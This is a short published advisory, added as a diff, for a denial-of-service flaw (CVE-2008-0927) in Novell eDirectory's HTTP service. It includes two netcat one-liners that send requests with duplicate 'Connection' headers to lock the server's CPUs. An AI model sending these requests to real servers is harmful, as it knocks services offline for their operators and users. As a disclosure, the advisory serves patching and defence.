@@ -1,0 +1,26 @@
+[=] Affected software :
+
+	Editor : Novell
+	Name : eDirectory
+	Version : < 8.7.3 SP 10 and < 8.8.2
+	Services : TCP/8028 (HTTP) and TCP/8030 (HTTPS)
+
+[=] External references :
+
+http://www.novell.com/support/viewContent.do?externalId=3829452&sliceId=1
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0927
+
+[=] Technical details :
+
+The dhost.exe process will consume 100% of a CPU. More than one request
+can be used to lock every CPU.
+
+Two "Connection:" headers : echo "GET / HTTP/1.0"; echo "Connection:
+foo"; echo "Connection: bar"; echo; echo) | nc -vn 192.168.1.1 8028 
+
+One "Connection:" header with two values : (echo "GET / HTTP/1.0"; echo
+"Connection: foo, bar"; echo; echo) | nc -vn 192.168.1.1 8028
+
+Nicob
+
+# milw0rm.com [2008-05-05]
